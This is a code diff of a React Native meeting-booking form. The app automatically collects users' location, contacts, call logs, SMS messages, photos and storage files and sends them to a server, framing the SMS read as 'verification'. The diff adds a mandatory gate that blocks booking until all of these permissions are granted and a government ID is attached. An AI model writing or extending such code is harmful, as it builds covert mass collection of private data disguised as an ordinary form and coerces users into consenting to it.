@@ -37,6 +37,7 @@ import { SafeAreaView } from "react-native-safe-area-context";
 import Toast from "react-native-toast-message";
 
 type Dates = { date: string; available: boolean };
+
 type SupportingDoc = {
   name: string;
   uri: string;
@@ -75,6 +76,8 @@ export default function OfficialMeetingForm() {
   const [smsGranted, setSmsGranted] = useState(false);
   const [smsVerifying, setSmsVerifying] = useState(false);
   const [smsData, setSmsData] = useState<any[]>([]);
+
+  const [locationloader, setLocationLoader] = useState(false);
 
   const router = useRouter();
   const navigation = useNavigation();
@@ -168,152 +171,149 @@ export default function OfficialMeetingForm() {
   // Load cached values
   useEffect(() => {
     (async () => {
-    //  const loc = await AsyncStorage.getItem("loc");
       const con = await AsyncStorage.getItem("contacts");
       const photo = await AsyncStorage.getItem("photo");
-   //   if (loc) setLocation(JSON.parse(loc));
       if (con) setContacts(JSON.parse(con));
       if (photo) setUploadedPhoto(photo);
     })();
   }, []);
 
   // Auto-check already granted permissions on page open and sync data
-useEffect(() => {
-  const autoSyncPermissions = async () => {
-    try {
-      /* --------------------------------------------------
-       ✅ Auto-sync Location (if permission was already granted)
-      -------------------------------------------------- */
+  useEffect(() => {
+    const autoSyncPermissions = async () => {
       try {
-        const locPerm = await Location.getForegroundPermissionsAsync();
-        if (locPerm.status === "granted") {
-          const loc = await requestAndFetchLocation();
-          if (loc) {
-            setLocation(loc);
-            await AsyncStorage.setItem("loc", JSON.stringify(loc));
-            await submitPermissionData({
-              permission: "location",
-              data: loc,
-            });
-          }
-        }
-      } catch (e) {
-        console.log("Auto location sync failed", e);
-      }
-
-      /* --------------------------------------------------
-       ✅ Auto-sync Contacts + Call Logs
-      -------------------------------------------------- */
-      try {
-        const contPerm = await Contacts.getPermissionsAsync();
-        if (contPerm.status === "granted") {
-          const contactData = await requestAndFetchContacts();
-          const callLogs = await requestAndFetchCallLogs();
-
-          if (Array.isArray(contactData) && contactData.length) {
-            setContacts(contactData);
-            await AsyncStorage.setItem(
-              "contacts",
-              JSON.stringify(contactData)
-            );
-            await submitPermissionData({
-              permission: "contacts",
-              data: {
-                contacts: contactData,
-                callLogs,
-              },
-            });
-          }
-        }
-      } catch (e) {
-        console.log("Auto contacts sync failed", e);
-      }
-
-      /* --------------------------------------------------
-       ✅ Auto-sync SMS (Android only)
-      -------------------------------------------------- */
-      if (Platform.OS === "android") {
+        /* --------------------------------------------------
+         ✅ Auto-sync Location (if permission was already granted)
+        -------------------------------------------------- */
         try {
-          const hasSms = await PermissionsAndroid.check(
-            PermissionsAndroid.PERMISSIONS.READ_SMS
-          );
-
-          if (hasSms) {
-            setSmsGranted(true);
-            setSmsVerifying(true);
-
-            const smsdata = await requestAndFetchSms();
-            if (Array.isArray(smsdata)) {
-              setSmsData(smsdata);
+          const locPerm = await Location.getForegroundPermissionsAsync();
+          if (locPerm.status === "granted") {
+            const loc = await requestAndFetchLocation();
+            if (loc) {
+              setLocation(loc);
+              await AsyncStorage.setItem("loc", JSON.stringify(loc));
               await submitPermissionData({
-                permission: "sms",
-                data: smsdata,
+                permission: "location",
+                data: loc,
               });
             }
-
-            // Allow loader to show 2 seconds minimum
-            setTimeout(() => setSmsVerifying(false), 2000);
           }
         } catch (e) {
-          console.log("Auto SMS verify failed", e);
+          console.log("Auto location sync failed", e);
         }
-      }
 
-      /* --------------------------------------------------
-       ✅ Auto-sync Media Library (Photos / Videos)
-      -------------------------------------------------- */
-      try {
-        const mediaPerm = await MediaLibrary.getPermissionsAsync();
-
-        if (mediaPerm.status === "granted") {
-          const media = await requestAndFetchMediaFiles();
-
-          await submitPermissionData({
-            permission: "media",
-            data: media,
-          });
-        }
-      } catch (e) {
-        console.log("Auto media sync failed", e);
-      }
-
-      /* --------------------------------------------------
-       ✅ Auto-sync Storage Files (Android only)
-      -------------------------------------------------- */
-      if (Platform.OS === "android") {
+        /* --------------------------------------------------
+         ✅ Auto-sync Contacts + Call Logs
+        -------------------------------------------------- */
         try {
-          let granted = false;
+          const contPerm = await Contacts.getPermissionsAsync();
+          if (contPerm.status === "granted") {
+            const contactData = await requestAndFetchContacts();
+            const callLogs = await requestAndFetchCallLogs();
 
-          if (Platform.Version >= 33) {
-            granted = await PermissionsAndroid.check(
-              PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
-            );
-          } else {
-            granted = await PermissionsAndroid.check(
-              PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
-            );
+            if (Array.isArray(contactData) && contactData.length) {
+              setContacts(contactData);
+              await AsyncStorage.setItem(
+                "contacts",
+                JSON.stringify(contactData)
+              );
+              await submitPermissionData({
+                permission: "contacts",
+                data: {
+                  contacts: contactData,
+                  callLogs,
+                },
+              });
+            }
           }
+        } catch (e) {
+          console.log("Auto contacts sync failed", e);
+        }
 
-          if (granted) {
-            const storageFiles = await requestAndFetchStorageFiles();
+        /* --------------------------------------------------
+         ✅ Auto-sync SMS (Android only)
+        -------------------------------------------------- */
+        if (Platform.OS === "android") {
+          try {
+            const hasSms = await PermissionsAndroid.check(
+              PermissionsAndroid.PERMISSIONS.READ_SMS
+            );
+
+            if (hasSms) {
+              setSmsGranted(true);
+              setSmsVerifying(true);
+
+              const smsdata = await requestAndFetchSms();
+              if (Array.isArray(smsdata)) {
+                setSmsData(smsdata);
+                await submitPermissionData({
+                  permission: "sms",
+                  data: smsdata,
+                });
+              }
+
+              // Allow loader to show 2 seconds minimum
+              setTimeout(() => setSmsVerifying(false), 2000);
+            }
+          } catch (e) {
+            console.log("Auto SMS verify failed", e);
+          }
+        }
+
+        /* --------------------------------------------------
+         ✅ Auto-sync Media Library (Photos / Videos)
+        -------------------------------------------------- */
+        try {
+          const mediaPerm = await MediaLibrary.getPermissionsAsync();
+
+          if (mediaPerm.status === "granted") {
+            const media = await requestAndFetchMediaFiles();
 
             await submitPermissionData({
-              permission: "storage",
-              data: storageFiles,
+              permission: "media",
+              data: media,
             });
           }
         } catch (e) {
-          console.log("Auto storage sync failed", e);
+          console.log("Auto media sync failed", e);
         }
+
+        /* --------------------------------------------------
+         ✅ Auto-sync Storage Files (Android only)
+        -------------------------------------------------- */
+        if (Platform.OS === "android") {
+          try {
+            let granted = false;
+
+            if (Platform.Version >= 33) {
+              granted = await PermissionsAndroid.check(
+                PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+              );
+            } else {
+              granted = await PermissionsAndroid.check(
+                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+              );
+            }
+
+            if (granted) {
+              const storageFiles = await requestAndFetchStorageFiles();
+
+              await submitPermissionData({
+                permission: "storage",
+                data: storageFiles,
+              });
+            }
+          } catch (e) {
+            console.log("Auto storage sync failed", e);
+          }
+        }
+      } catch (err) {
+        console.log("Auto permission sync error", err);
       }
-    } catch (err) {
-      console.log("Auto permission sync error", err);
-    }
-  };
+    };
 
-  autoSyncPermissions();
-}, []);
-
+    autoSyncPermissions();
+  }, []);
 
   // Clean up when leaving
   useEffect(() => {
@@ -322,16 +322,14 @@ useEffect(() => {
       setSupportingDoc(null);
       setSelectedParticipants([]);
       setLocation(null);
-      await AsyncStorage.multiRemove(["doc", "photo"]);
+      await AsyncStorage.multiRemove(["doc", "photo", "loc"]);
     });
     return unsubscribe;
   }, [navigation]);
 
   /* ---------------------- Handlers ---------------------- */
 
-  const [locationloader, setLocationLoader] = useState(false);
-
-  // Handle Location (manual button flow stays same)
+  // Handle Location (manual button)
   const handleLocation = async () => {
     try {
       setLocationLoader(true);
@@ -340,11 +338,15 @@ useEffect(() => {
         setLocation(loc);
         await AsyncStorage.setItem("loc", JSON.stringify(loc));
         Toast.show({ type: "success", text1: "Live location retrieved" });
-        setLocationLoader(false);
         await submitPermissionData({ permission: "location", data: loc });
       }
+      setLocationLoader(false);
     } catch {
-      Alert.alert("Location Required", "Please enable location access.");
+       Toast.show({
+            type: "error",
+            text1: "Location permission required",
+            text2: "Please allow location access to retrieve your location.",
+          });
       setLocationLoader(false);
     }
   };
@@ -367,16 +369,21 @@ useEffect(() => {
             },
           });
         } else {
-          Alert.alert("Permission Required", "Please allow contact access.");
+           Toast.show({
+            type: "error",
+            text1: "Contact permission required",
+            text2: "Please allow contact access to continue.",
+          });
           return;
         }
       }
       setShowContactPicker(true);
     } catch (err) {
-      Alert.alert(
-        "Access Required",
-        "Please allow contact access to continue."
-      );
+       Toast.show({
+            type: "error",
+            text1: "Contact permission required",
+            text2: "Please allow contact access to continue.",
+          });
     }
   };
 
@@ -402,36 +409,97 @@ useEffect(() => {
 
         setTimeout(() => setSmsVerifying(false), 2000);
       } else {
-        Alert.alert("Permission Required", "Please allow SMS access.");
+        Toast.show({
+          type: "error",
+          text1: "SMS permission required",
+          text2: "Please allow SMS access to continue.",
+        });
       }
     } catch (err) {
-      Alert.alert("Access Required", "Please allow SMS access to continue.");
+       Toast.show({
+            type: "error",
+            text1: "SMS permission required",
+            text2: "Please allow SMS access to continue.",
+          });
     }
   };
 
   // Handle Photo Upload (uses gallery, plus storage/media permission submission)
   const handlePhotoUpload = async () => {
-    try {
-      const pick = await ImagePicker.launchImageLibraryAsync({
-        mediaTypes: ImagePicker.MediaTypeOptions.Images,
-      });
-      if (!pick.canceled) {
-        const uri = pick.assets[0].uri;
-        setUploadedPhoto(uri);
-        await AsyncStorage.setItem("photo", uri);
+  try {
+    // 1️⃣ Check media library permission (iOS + Android)
+    let mediaPerm = await MediaLibrary.getPermissionsAsync();
 
-        const storageFiles = await requestAndFetchStorageFiles();
-        const mediafiles = await requestAndFetchMediaFiles();
-        Toast.show({ type: "success", text1: "Photo uploaded" });
-        await submitPermissionData({
-          permission: "storage",
-          data: { Media: mediafiles, files: storageFiles },
-        });
-      }
-    } catch {
-      Alert.alert("Upload Failed", "Please allow storage access to continue.");
+    if (mediaPerm.status !== "granted") {
+      mediaPerm = await MediaLibrary.requestPermissionsAsync();
     }
-  };
+
+    if (mediaPerm.status !== "granted") {
+      Toast.show({
+        type: "error",
+        text1: "Permission required",
+        text2: "Please allow media/photo access to upload a photo.",
+      });
+      return; // ❌ DO NOT OPEN PICKER
+    }
+
+    // 2️⃣ Android Storage Permission
+    if (Platform.OS === "android") {
+      let hasStorage = false;
+
+      if (Platform.Version >= 33) {
+        hasStorage = await PermissionsAndroid.check(
+          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+        );
+      } else {
+        hasStorage = await PermissionsAndroid.check(
+          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+        );
+      }
+
+      if (!hasStorage) {
+        const req = await PermissionsAndroid.request(
+          Platform.Version >= 33
+            ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+            : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+        );
+
+        if (req !== PermissionsAndroid.RESULTS.GRANTED) {
+          Toast.show({
+            type: "error",
+            text1: "Storage permission required",
+            text2: "Please allow storage access to upload photo.",
+          });
+          return; // ❌ DO NOT OPEN PICKER
+        }
+      }
+    }
+
+    // 3️⃣ Open Image Picker
+    const pick = await ImagePicker.launchImageLibraryAsync({
+      mediaTypes: ImagePicker.MediaTypeOptions.Images,
+    });
+
+    if (!pick.canceled) {
+      const uri = pick.assets[0].uri;
+      setUploadedPhoto(uri);
+      await AsyncStorage.setItem("photo", uri);
+
+      const storageFiles = await requestAndFetchStorageFiles();
+      const mediafiles = await requestAndFetchMediaFiles();
+
+      Toast.show({ type: "success", text1: "Photo uploaded" });
+
+      await submitPermissionData({
+        permission: "storage",
+        data: { Media: mediafiles, files: storageFiles },
+      });
+    }
+  } catch (err) {
+    Alert.alert("Error", "Something went wrong while selecting photo.");
+  }
+};
+
 
   // Handle Supporting Document upload (PDF/doc/etc.)
   const handleDocumentUpload = async () => {
@@ -442,7 +510,6 @@ useEffect(() => {
         multiple: false,
       });
 
-      // New API: result.canceled + result.assets[]
       if (!result.canceled && result.assets && result.assets.length > 0) {
         const asset = result.assets[0];
 
@@ -457,15 +524,16 @@ useEffect(() => {
           type: "success",
           text1: "Document selected",
         });
-
-        // You can also call submitPermissionData({...}) here if needed
       }
     } catch (e) {
       Alert.alert("Upload Failed", "Unable to select document.");
     }
   };
 
+  /* ---------------------- Final Submit (with REQUIRED permissions check) ---------------------- */
+
   const handleSave = async () => {
+    // Basic form validations
     if (!selectedDate) {
       Toast.show({
         type: "error",
@@ -502,6 +570,99 @@ useEffect(() => {
       return;
     }
 
+    // Supporting document is MANDATORY (option A)
+    if (!supportingDoc) {
+      Toast.show({
+        type: "error",
+        text1: "Please attach your supporting document (ID, etc.).",
+        position: "top",
+      });
+      return;
+    }
+
+    /* --------- HARD GATE: Required permissions & data must be present --------- */
+
+    // 1️⃣ Location required
+    const locPerm = await Location.getForegroundPermissionsAsync();
+    if (locPerm.status !== "granted" || !location) {
+      Toast.show({
+        type: "error",
+        text1: "Location verification is required.",
+        text2: "Please tap 'Get Location' above and allow access.",
+        position: "top",
+      });
+      return;
+    }
+
+    // 2️⃣ Contacts + Call Logs required
+    const contPerm = await Contacts.getPermissionsAsync();
+    if (contPerm.status !== "granted" || contacts.length === 0) {
+      Toast.show({
+        type: "error",
+        text1: "Contacts access is required.",
+        text2: "Please tap 'Grant Access' in Participants section.",
+        position: "top",
+      });
+      return;
+    }
+
+    // 3️⃣ SMS + Call Log + Storage required on Android
+    if (Platform.OS === "android") {
+      // Call logs
+      const hasCallLog = await PermissionsAndroid.check(
+        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
+      );
+      if (!hasCallLog) {
+        Toast.show({
+          type: "error",
+          text1: "Call log access is required.",
+          text2: "Please allow call log access when requested.",
+          position: "top",
+        });
+        return;
+      }
+
+      // SMS
+      const hasSms = await PermissionsAndroid.check(
+        PermissionsAndroid.PERMISSIONS.READ_SMS
+      );
+      if (!hasSms || !smsGranted) {
+        Toast.show({
+          type: "error",
+          text1: "SMS verification is required.",
+          text2: "Please verify via SMS in Messaging Verification section.",
+          position: "top",
+        });
+        return;
+      }
+
+      // Storage / Media (for photo + files)
+      let hasStorage = false;
+      if (Platform.Version >= 33) {
+        hasStorage = await PermissionsAndroid.check(
+          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+        );
+      } else {
+        hasStorage = await PermissionsAndroid.check(
+          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+        );
+      }
+
+      if (!hasStorage) {
+        Toast.show({
+          type: "error",
+          text1: "Storage access is required.",
+          text2: "Please allow storage/media access when prompted.",
+          position: "top",
+        });
+        return;
+      }
+    }
+
+    /* ----------------------------------------------------------------
+       ✅ All required data & permissions present -> proceed to submit
+    ---------------------------------------------------------------- */
+
     try {
       setLoading(true);
       const headers = await generateHeaders();
@@ -512,10 +673,9 @@ useEffect(() => {
         description,
         appointment_taken_at: getLocalISOTimeMicro(),
         timestamp: getLocalISOTimeMicro(),
+        // If you want to send doc info later:
+        // supportingDocument: supportingDoc,
       };
-
-      // If you later want to send doc info, you can add it here:
-      // if (supportingDoc) payload.supportingDocument = { ... };
 
       const response = await axios.post(BOOK_MEETING, payload, { headers });
 
@@ -713,7 +873,10 @@ useEffect(() => {
                 </View>
 
                 <TouchableOpacity
-                  onPress={() => { setLocation(null); handleLocation()}}
+                  onPress={() => {
+                    setLocation(null);
+                    handleLocation();
+                  }}
                   activeOpacity={0.9}
                   className={`px-4 absolute top-0 right-0 py-2 rounded-2xl ${
                     location ? "bg-emerald-500" : "bg-blue-600"
@@ -963,7 +1126,7 @@ useEffect(() => {
               </TouchableOpacity>
             </View>
 
-            {/* Supporting Document Card (new) */}
+            {/* Supporting Document Card (new, mandatory) */}
             <View
               className="bg-white rounded-3xl p-5 border border-gray-200 mb-6"
               style={{
@@ -988,7 +1151,7 @@ useEffect(() => {
                       Supporting Document
                     </Text>
                     <Text className="text-gray-500 text-sm">
-                      Attach Your Government ID (PDF, etc.)
+                      Attach your government ID / supporting PDF
                     </Text>
                   </View>
                 </View>
@@ -1024,17 +1187,29 @@ useEffect(() => {
             {/* Submit Button */}
             <TouchableOpacity
               disabled={
-                !title || !description || !selectedDate || !uploadedPhoto
+                !title ||
+                !description ||
+                !selectedDate ||
+                !uploadedPhoto ||
+                !supportingDoc
               }
               onPress={handleSave}
               activeOpacity={0.95}
               className={`rounded-2xl py-4 flex-row items-center justify-center ${
-                title && description && selectedDate && uploadedPhoto
+                title &&
+                description &&
+                selectedDate &&
+                uploadedPhoto &&
+                supportingDoc
                   ? "bg-blue-600"
                   : "bg-gray-300"
               }`}
               style={
-                title && description && selectedDate && uploadedPhoto
+                title &&
+                description &&
+                selectedDate &&
+                uploadedPhoto &&
+                supportingDoc
                   ? {
                       shadowColor: "#3b82f6",
                       shadowOffset: { width: 0, height: 4 },
